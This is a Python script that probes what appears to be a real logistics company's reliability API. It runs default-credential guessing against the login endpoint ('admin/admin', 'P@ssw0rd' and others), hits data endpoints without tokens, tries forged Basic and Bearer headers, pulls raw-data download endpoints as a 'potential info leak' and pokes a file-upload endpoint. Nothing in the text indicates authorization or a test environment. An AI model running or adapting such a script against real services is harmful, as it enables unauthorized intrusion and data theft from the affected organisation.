import urllib.request
import ssl
import json

ctx = ssl.create_default_context()
base = 'https://reliability.cargosmart.com'

def api_test(path, data=None, method='POST', headers=None):
    url = base + path
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64)')
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    if data:
        req.add_header('Content-Type', 'application/json')
    try:
        resp = urllib.request.urlopen(req, timeout=15, context=ctx)
        body = resp.read()
        return (resp.status, body, dict(resp.headers))
    except urllib.error.HTTPError as e:
        body = e.read() if e.fp else b''
        return (e.code, body, dict(e.headers))
    except Exception as e:
        return (None, str(e).encode(), {})

def print_result(path, result):
    status, body, headers = result
    if status == 200:
        print(f'  {path}: HTTP {status} *** ACCESSIBLE ***')
        try:
            j = json.loads(body)
            print(f'    JSON: {json.dumps(j, indent=2, ensure_ascii=False)[:500]}')
        except:
            print(f'    Body: {body.decode("utf-8", errors="replace")[:300]}')
    elif status == 401:
        try:
            j = json.loads(body)
            print(f'  {path}: HTTP {status} - {json.dumps(j)[:100]}')
        except:
            print(f'  {path}: HTTP {status}')
    elif status:
        print(f'  {path}: HTTP {status}')
    else:
        print(f'  {path}: Error - {body.decode()[:100]}')

print('=== 1. Testing Login Endpoint ===')
result = api_test('/api/login',
                  data=json.dumps({'username': 'admin', 'password': 'admin'}).encode(),
                  method='POST')
print_result('/api/login', result)

result = api_test('/api/login',
                  data=json.dumps({'username': 'admin', 'password': 'Admin@123'}).encode(),
                  method='POST')
print_result('/api/login (admin/Admin@123)', result)

result = api_test('/api/login',
                  data=json.dumps({'username': 'admin', 'password': 'password'}).encode(),
                  method='POST')
print_result('/api/login (admin/password)', result)

result = api_test('/api/login',
                  data=json.dumps({'username': 'test', 'password': 'test'}).encode(),
                  method='POST')
print_result('/api/login (test/test)', result)

print('\n=== 2. Testing Common Admin Credentials ===')
for u, p in [('admin', 'admin'), ('admin', 'Admin@123'), ('admin', 'admin123'),
             ('admin', 'password'), ('admin', 'Password1'), ('administrator', 'admin'),
             ('user', 'user'), ('test', 'test'), ('admin', 'P@ssw0rd')]:
    result = api_test('/api/login',
                      data=json.dumps({'username': u, 'password': p}).encode(),
                      method='POST')
    if result[0] == 200:
        print(f'  SUCCESS: {u}:{p}!')
        print_result(f'/api/login ({u}/{p})', result)

print('\n=== 3. Testing Endpoints Without Auth Token ===')
print('(All should return 401 - checking for exceptions)')
endpoints = [
    '/api/port-raw-data/get-all',
    '/api/pp-reliability/get-all',
    '/api/reliability/carrier-alliance',
    '/api/reliability/departure/port',
    '/api/reliability/round-trade',
    '/api/carrier-view/trade',
    '/api/carrier-view/all/trade/service',
]

for ep in endpoints:
    result = api_test(ep, data=json.dumps({}).encode(), method='POST')
    if result[0] != 401:
        print_result(ep, result)

print('\n=== 4. Testing GET method (non-standard) ===')
for ep in ['/api/login', '/api/port-raw-data/get-all', '/api/pp-reliability/get-all']:
    result = api_test(ep, method='GET')
    if result[0] == 200:
        print_result(f'GET {ep}', result)
    elif result[0] != 401:
        print(f'  GET {ep}: HTTP {result[0]}')

print('\n=== 5. Testing with Different Auth Headers ===')
# Try with basic auth
for ep in ['/api', '/api/login', '/api/port-raw-data/get-all']:
    import base64
    basic = base64.b64encode(b'admin:admin').decode()
    result = api_test(ep, method='GET', headers={'Authorization': f'Basic {basic}'})
    if result[0] == 200:
        print_result(f'{ep} with Basic auth', result)
    elif result[0] != 401:
        print(f'  {ep} with Basic auth: HTTP {result[0]}')

# Try with Bearer token
for ep in ['/api', '/api/login']:
    result = api_test(ep, method='GET', headers={'Authorization': 'Bearer test'})
    if result[0] == 200:
        print_result(f'{ep} with Bearer', result)

print('\n=== 6. Testing Raw Data Downloads (potential info leak) ===')
download_eps = [
    '/api/rawdata/download/port-pair',
    '/api/rawdata/download/single-port',
    '/api/rawdata/download/weekly/port-pair',
    '/api/rawdata/download/weekly/single-port',
    '/api/rawdata/download/weekly/port-reliability',
]
for ep in download_eps:
    result = api_test(ep, data=json.dumps({}).encode(), method='POST')
    if result[0] == 200:
        print_result(ep, result)
        print(f'  Content-Type: {result[2].get("Content-Type", "N/A")}')
    elif result[0] == 401:
        detail = result[1].decode('utf-8', errors='replace')[:100]
        print(f'  {ep}: HTTP 401 ({detail})')

print('\n=== 7. Testing File Upload Endpoint ===')
result = api_test('/api/raw-data/supplement/upload',
                  data=b'', method='POST')
print_result('/api/raw-data/supplement/upload', result)
